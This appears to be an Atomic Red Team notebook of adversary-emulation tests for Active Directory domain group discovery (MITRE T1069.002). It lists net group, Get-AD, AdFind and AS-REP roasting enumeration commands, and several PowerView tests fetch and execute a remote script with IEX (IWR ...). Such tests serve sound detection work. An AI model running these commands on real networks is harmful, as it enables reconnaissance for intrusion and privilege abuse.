{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2937b424",
   "metadata": {},
   "source": "# T1069.002 - Domain Groups\nAdversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups."
  },
  {
   "cell_type": "markdown",
   "id": "7668ebbe",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "197f30c5",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Basic Permission Groups Discovery Windows (Domain)",
    "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet localgroup\nnet group /domain\nnet group \"domain admins\" /domain\nnet group \"enterprise admins\" /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "953c5a8c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1bf08f28",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Permission Groups Discovery PowerShell (Domain)",
    "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-ADPrincipalGroupMembership administrator | select name\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e762f53",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "fe681d20",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Elevated group enumeration using net group (Domain)",
    "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e514acae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "9bd86951",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Find machines where user has local admin access (PowerView)",
    "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3115b2d2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "37bd1ef1",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Find local admins on all machines in domain (PowerView)",
    "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2cf0b7c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "6252175b",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Find Local Admins via Group Policy (PowerView)",
    "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fac44073",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "7f5d7e6b",
   "metadata": {},
   "source": "### Atomic Test #7 - Enumerate Users Not Requiring Pre Auth (ASRepRoast)\nWhen successful, accounts that do not require kerberos pre-auth will be returned\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined.\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually.\n\n```\n##### Description: Requires the Active Directory module for powershell to be installed.\n\n##### Check Prereq Commands:\n```powershell\nif(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nAdd-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0b07935",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8fbb0b54",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0bb7801",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "f32e1774",
   "metadata": {},
   "source": "### Atomic Test #8 - Adfind - Query Active Directory Groups\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (#{adfind_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a6880252",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "24ada089",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1087.002\\src\\AdFind.exe -f (objectcategory=group)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1e291602",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "cd0c7d4d",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Enumerate Active Directory Groups with Get-AdGroup",
    "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-AdGroup -Filter *\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8dfed95c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "9e45d1a5",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Enumerate Active Directory Groups with ADSISearcher",
    "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fdb6b813",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "4d699995",
   "metadata": {},
   "source": "### Atomic Test #11 - Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)\nWhen successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined.\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually.\n\n```\n##### Description: Requires the Active Directory module for powershell to be installed.\n\n##### Check Prereq Commands:\n```powershell\nif(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nAdd-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f81628c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e7799b4f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6282570",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "6cc4f400",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Get-DomainGroupMember with PowerView",
    "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5f29371d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "d88b1c5b",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Get-DomainGroup with PowerView",
    "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee24252d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "1ed62272",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}